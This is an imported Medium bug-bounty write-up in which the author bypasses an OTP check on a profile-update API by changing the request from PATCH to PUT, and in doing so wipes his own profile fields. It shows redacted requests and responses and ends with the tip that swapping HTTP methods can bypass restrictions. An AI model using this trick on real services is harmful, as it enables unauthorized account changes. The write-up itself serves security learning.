---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-01-20_how-i-messed-up-my-own-profile-data.md
original_filename: 2022-01-20_how-i-messed-up-my-own-profile-data.md
title: How I messed up my own profile data
category: documents
detected_topics:
- access-control
- command-injection
- otp
- api-security
tags:
- imported
- documents
- access-control
- command-injection
- otp
- api-security
language: en
raw_sha256: b30dc15e2ab77214a7b425346fbe0fea309590306062d4e5353cfcb6c6e3e84a
text_sha256: b60db38d9a5469368df40359cddc25221ca598abf95d8a0158c2a8002a553fc0
ingested_at: '2026-06-28T07:32:09Z'
sensitivity: unknown
redactions_applied: false
---

# How I messed up my own profile data

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-01-20_how-i-messed-up-my-own-profile-data.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:32:09Z
- Redactions Applied: False
- Raw SHA256: `b30dc15e2ab77214a7b425346fbe0fea309590306062d4e5353cfcb6c6e3e84a`
- Text SHA256: `b60db38d9a5469368df40359cddc25221ca598abf95d8a0158c2a8002a553fc0`


## Content

---
title: "How I messed up my own profile data"
url: "https://medium.com/@himmat1005/how-i-messed-up-my-own-profile-data-94a4b09cb54c"
authors: ["Himmat Singh"]
bugs: ["Broken authorization"]
publication_date: "2022-01-20"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2994
scraped_via: "browseros"
---

# How I messed up my own profile data

Press enter or click to view image in full size
How I messed up my own profile data
Himmat Singh
Follow
3 min read
·
Jan 19, 2022

4

Just wanted to share one of my experience which I had while testing one of the web application. I will be brief so that I do not waste anyone’s time :

1. Logged into the website ==> Go to profile ==> Change ‘username’ field (test_user) ==> submit ==> Intercept the request with BurpSuit & forward it, you will see REQUEST & RESPONSE as follows :

Request :

PATCH /redacted/updateProfile

……

……

{‘user’:’test_user’}

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.

Response :

HTTP/1.1 200 OK

{‘user’:’test_user’,’number’:’9999999999',’email’:’test@gmail.com’,’first’:’test’,’last’:’user’….}

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

2. Here according to the website functionality, if user wants to change their phone-number from PROFILE section, they need to send an OTP first & then submit it.

3. However I thought of updating the phone number directly using /updateProfile API by sending the following request :

Request :

PATCH /redacted/updateProfile

……

……

{‘user’:’test_user’,’number’:’1234567890'}

>>>>>>>>>>>>>>>>>>>>>>>>>>

Response :

HTTP/1.1 401 Unauthorized

…..

{‘error’,’Updating Phone-number requires an OTP paramater’}

Get Himmat Singh’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

>>>>>>>>>>>>>>>>>>>>>>>>>>>

4. So I need to submit an OTP with this request as well which i don’t have.

5. As I knew, PUT http-method is also used to update records, I simply changed PATCH http-method ==> PUT in the request and forward that request from BurpSuit :

Request :

PUT /redacted/updateProfile

……

……

{‘user’:’test_user’,’number’:’1234567890'}

>>>>>>>>>>>>>>>>>>>>>>>>>>>>

Response :

HTTP/1.1 200 OK

{‘username’:’test_user’,’number’:’1234567890',’email’:’test@gmail.com’,’first’:’test’,’last’:’user’….}

>>>>>>>>>>>>>>>>>>>>>>>>>>>>

6. Seeing this response, I was full of joy however it didn’t last.

7. When I logged out & logged back in with my username, whole page was broken for e.g. I was not able to see my name and other profile information as well and it was showing UNDEFINED everywhere in all the fields data.

So what did go wrong?

After some thinking I realized that if we use PATCH http-method to send data, server would only update that specific data or parameters for e.g. with below body in PATCH request, it would only update ‘username’ :

Request Body : {‘username’:’test_user’}

However if we use PUT http-method to send data, server mostly uses it to update the whole record (note : it depends on the API configuration as well but mostly it happens ) instead of specific parameters mentioned in the request body.

Which means sending below request body would update whole record of user by putting NULL for all the parameters which were not sent with the request ( e.g ‘first’,’last’,’email’ etc ) which leads to UNDEFINED being shown in my profile everywhere:

Request Body : {‘username’:’test_user’,’number’:’1234567890’}

Learning :

Changing PUT ==> PATCH / PATCH ==> PUT may help you bypass some restrictions
Be aware as using PUT may mess-up all the data related to a particular user as it updates the whole record.

This is my first post on medium & I know it is not really well formatted but that’s the best I could do given the fact I had to attend a meeting after 10 min.

Do like & comment in case you have any doubts.

CHEERS!!!! :)
